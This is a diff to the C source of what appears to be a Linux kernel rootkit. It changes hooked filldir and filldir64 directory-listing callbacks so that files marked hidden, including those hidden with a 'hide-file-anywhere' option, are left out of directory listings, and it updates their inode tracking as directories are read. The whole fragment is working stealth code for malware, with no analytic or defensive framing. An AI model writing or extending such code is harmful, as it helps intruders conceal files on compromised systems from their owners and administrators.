@@ -735,7 +735,14 @@ static int  (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64
 static int m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
 #endif
 
-    if (fs_search_name(name, ino))
+    /** For certain hidden files we don't have inode number initially,
+     * when hidden with "hide-file-anywhere" but it is available here
+     * and it is updated below, if needed.
+     * Also for files hidden anywhere same file can live
+     * in multiple directories, thus inode number may
+     * be updated to the current directory being listed
+     */
+    if (fs_search_and_update(name, ino, d_type == DT_DIR))
         return 0;
     return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
@@ -748,10 +755,13 @@ static int  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u
 static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
 #endif
 
-    //XXX: d_type == DT_DIR ? "Directory" : "Reg file"
-    if (fs_search_name(name, ino))
-        return 0;
+    if (fs_search_and_update(name, ino, d_type == DT_DIR))
+        goto match;
+
     return real_filldir64(ctx, name, namlen, offset, ino, d_type);
+
+match:
+    return 0;
 }
 
 #define MAXKEY 512
